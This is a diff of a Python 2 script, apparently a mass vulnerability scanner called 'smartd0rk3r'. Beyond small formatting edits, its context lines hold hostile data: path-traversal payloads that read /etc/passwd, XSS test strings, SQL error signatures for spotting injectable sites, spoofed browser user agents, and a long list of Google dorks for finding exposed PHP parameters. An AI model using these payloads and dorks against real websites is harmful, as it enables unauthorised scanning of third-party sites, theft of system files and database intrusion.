@@ -48,14 +48,12 @@ def logo():
         print "|---------------------------------------------------------------|\n"
 	print W
 
-if sys.platform == 'linux' or sys.platform == 'linux2':
-  subprocess.call("clear", shell=True)
-  logo()
-  
+if sys.platform in ['linux', 'linux2']:
+	subprocess.call("clear", shell=True)
 else:
-  subprocess.call("cls", shell=True)
-  logo()
-  
+	subprocess.call("cls", shell=True)
+logo()
+
 log = "smartd0rk3r-sqli.txt"
 logfile = open(log, "a")
 lfi_log = "smartd0rk3r-lfi.txt"
@@ -79,7 +77,7 @@ socket.setdefaulttimeout(timeout)
 
 
 
-           
+
 lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
 
 xsses = ["<h1>XSS by baltazar</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E"]
@@ -115,7 +113,7 @@ sqlerrors = {'MySQL': 'error in your SQL syntax',
              'GetArray()' : 'GetArray()',
              'FetchRow()' : 'FetchRow()',
              'Input string was not in a correct format' : 'Input string was not in a correct format'}
-             
+
 
 header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
           'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
@@ -132,8 +130,8 @@ header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
 	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
 	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
 	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']
-	  
-           
+
+
 
 d0rk = [ 'artikelinfo.php?id=', 'index.php?=', 'profile_view.php?id=', 'category.php?id=', 'fellows.php?id=', 'downloads_info.php?id=', 'prod_info.php?id=', 'shop.php?do=part&id=', 'collectionitem.php?id=', 'band_info.php?id=', 'product.php?id=', 'viewshowdetail.php?id=', 'clubpage.php?id=', 'memberInfo.php?id=', 'tradeCategory.php?id=', 'transcript.php?id=', 'item_id=', 'news-full.php?id=', 'aboutbook.php?id=', 'preview.php?id=', 'material.php?id=', 'read.php?id=', 'viewapp.php?id=', 'story.php?id=', 'newsone.php?id=', 'rubp.php?idr=', 'art.php?idm=', 'title.php?id=', 'index1.php?modo=', 'include.php?*[*]*=', 'nota.php?pollname=', 'index3.php?p=', 'padrao.php?pre=', 'home.php?pa=', 'main.php?type=', 'sitio.php?start=', '*.php?include=', 'general.php?xlink=', 'show.php?go=', 'nota.php?ki=', 'down*.php?oldal=', 'layout.php?disp=', 'enter.php?chapter=', 'base.php?incl=', 'enter.php?mod=', 'show.php?corpo=', 'head.php?*[*]*=', 'info.php?strona=', 'template.php?str=', 'main.php?doshow=', 'view.php?*[*]*=', 'index.php?to=', 'page.php?cmd=', 'view.php?b=', 'info.php?option=', 'show.php?x=', 'template.php?texto=', 'index3.php?ir=', 'print.php?chapter=', 'file.php?inc=', 'file.php?cont=', 'view.php?cmd=', 'include.php?chapter=', 'path.php?my=', 'principal.php?param=', 'general.php?menue=', 'index1.php?b=', 'info.php?chapter=', 'nota.php?chapter=', 'readnews.php?id=', 'newsone.php?id=', 'product-item.php?id=', 'pages.php?id=', 'clanek.php4?id=', 'viewapp.php?id=', 'viewphoto.php?id=', 'galeri_info.php?l=', 'iniziativa.php?in=', 'curriculum.php?id=', 'labels.php?id=', 'story.php?id=', 'look.php?ID=', 'aboutbook.php?id=', '"id=" & intext:"Warning: mysql_fetch_assoc()', '"id=" & intext:"Warning: is_writable()', '"id=" & intext:"Warning: Unknown()', '"id=" & intext:"Warning: mysql_result()', '"id=" & intext:"Warning: pg_exec()', '"id=" & intext:"Warning: require()', 'buy.php?category=', 'pageid=', 'page.php?file=', 'show.php?id=', 'newsitem.php?num=', 'readnews.php?id=', 'top10.php?cat=', 'reagir.php?num=', 'Stray-Questions-View.php?num=', 'forum_bds.php?num=', 'game.php?id=', 'view_product.php?id=', 'sw_comment.php?id=', 'news.php?id=', 'avd_start.php?avd=', 'event.php?id=', 'sql.php?id=', 'select_biblio.php?id=', 'ogl_inet.php?ogl_id=', 'fiche_spectacle.php?id=', 'kategorie.php4?id=', 'faq2.php?id=', 'show_an.php?id=', 'loadpsb.php?id=', 'announce.php?id=', 'participant.php?id=', 'download.php?id=', 'article.php?id=', 'person.php?id=', 'productinfo.php?id=', 'showimg.php?id=', 'rub.php?idr=', 'view_faq.php?id=', 'hosting_info.php?id=', 'gery.php?id=', 'rub.php?idr=', 'view_faq.php?id=', 'artikelinfo.php?id=', 'detail.php?ID=', 'index.php?=', 'profile_view.php?id=', 'category.php?id=', 'publications.php?id=', 'fellows.php?id=', 'downloads_info.php?id=', 'prod_info.php?id=', 'shop.php?do=part&id=', 'collectionitem.php?id=', 'band_info.php?id=', 'product.php?id=', 'releases.php?id=', 'ray.php?id=', 'produit.php?id=', 'pop.php?id=', 'shopping.php?id=']
 d0rk += [ 'productdetail.php?id=', 'post.php?id=', 'viewshowdetail.php?id=', 'clubpage.php?id=', 'memberInfo.php?id=', 'section.php?id=', 'theme.php?id=', 'page.php?id=', 'shredder-categories.php?id=', 'tradeCategory.php?id=', 'product_ranges_view.php?ID=', 'shop_category.php?id=', 'transcript.php?id=', 'channel_id=', 'item_id=', 'newsid=', 'trainers.php?id=', 'news-full.php?id=', 'news_display.php?getid=', 'index2.php?option=', 'article.php?ID=', 'play_old.php?id=', 'newsitem.php?num=', 'top10.php?cat=', 'historialeer.php?num=', 'reagir.php?num=', 'Stray-Questions-View.php?num=', 'forum_bds.php?num=', 'game.php?id=', 'view_product.php?id=', 'sw_comment.php?id=', 'news.php?id=', 'avd_start.php?avd=', 'event.php?id=', 'sql.php?id=', 'news_view.php?id=', 'select_biblio.php?id=', 'humor.php?id=', 'ogl_inet.php?ogl_id=', 'fiche_spectacle.php?id=', 'communique_detail.php?id=', 'sem.php3?id=', 'kategorie.php4?id=', 'faq2.php?id=', 'show_an.php?id=', 'preview.php?id=', 'loadpsb.php?id=', 'opinions.php?id=', 'spr.php?id=', 'announce.php?id=', 'participant.php?id=', 'download.php?id=', 'main.php?id=', 'review.php?id=', 'chappies.php?id=', 'read.php?id=', 'prod_detail.php?id=', 'article.php?id=', 'person.php?id=', 'productinfo.php?id=', 'showimg.php?id=', 'view.php?id=', 'website.php?id=', 'website.php?id=', 'hosting_info.php?id=', 'gery.php?id=', 'detail.php?ID=', 'publications.php?id=', 'Productinfo.php?id=', 'releases.php?id=', 'ray.php?id=', 'produit.php?id=', 'pop.php?id=', 'shopping.php?id=', 'productdetail.php?id=', 'post.php?id=', 'section.php?id=', 'theme.php?id=', 'page.php?id=', 'shredder-categories.php?id=', 'product_ranges_view.php?ID=', 'shop_category.php?id=', 'channel_id=', 'newsid=', 'news_display.php?getid=', 'ages.php?id=', 'clanek.php4?id=', 'review.php?id=', 'iniziativa.php?in=', 'curriculum.php?id=', 'labels.php?id=', 'look.php?ID=', 'galeri_info.php?l=', 'tekst.php?idt=', 'newscat.php?id=', 'newsticker_info.php?idn=', 'rubrika.php?idr=', 'offer.php?idf=', '"id=" & intext:"Warning: mysql_fetch_array()', '"id=" & intext:"Warning: getimagesize()', '"id=" & intext:"Warning: session_start()', '"id=" & intext:"Warning: mysql_num_rows()', '"id=" & intext:"Warning: mysql_query()', '"id=" & intext:"Warning: array_merge()', '"id=" & intext:"Warning: preg_match()', '"id=" & intext:"Warning: ilesize()', '"id=" & intext:"Warning: filesize()', 'index.php?id=', 'buy.php?category=', 'index.php?page=', 'trainers.php?id=', 'article.php?ID=', 'play_old.php?id=', 'declaration_more.php?decl_id=', 'Pageid=', 'games.php?id=', 'newsDetail.php?id=', 'staff_id=', 'historialeer.php?num=', 'product-item.php?id=', 'news_view.php?id=', 'humor.php?id=', 'communique_detail.php?id=', 'sem.php3?id=', 'opinions.php?id=', 'spr.php?id=', 'pages.php?id=', 'chappies.php?id=', 'prod_detail.php?id=', 'viewphoto.php?id=', 'view.php?id=' ]
